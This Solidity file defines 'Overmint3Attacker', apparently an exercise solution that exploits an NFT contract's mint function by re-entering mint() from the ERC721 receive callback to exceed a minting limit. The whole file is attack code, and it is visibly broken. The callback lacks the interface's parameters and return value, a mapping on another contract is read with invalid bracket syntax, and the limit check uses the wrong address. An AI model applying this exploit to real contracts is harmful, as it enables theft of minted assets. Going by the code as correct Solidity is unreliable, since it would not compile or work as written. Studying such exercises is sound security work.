// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "./Overmint3.sol";

contract Overmint3Attacker is IERC721Receiver {
    Overmint3 public overmint3;

    function attack(address _overmint3) external {
        overmint3 = Overmint3(_overmint3);
        overmint3.mint();
    }

    function onERC721Received() external {
        if (overmint3.amountMinted[msg.sender] <= 5) {
            overmint3.mint();
        }
    }
}
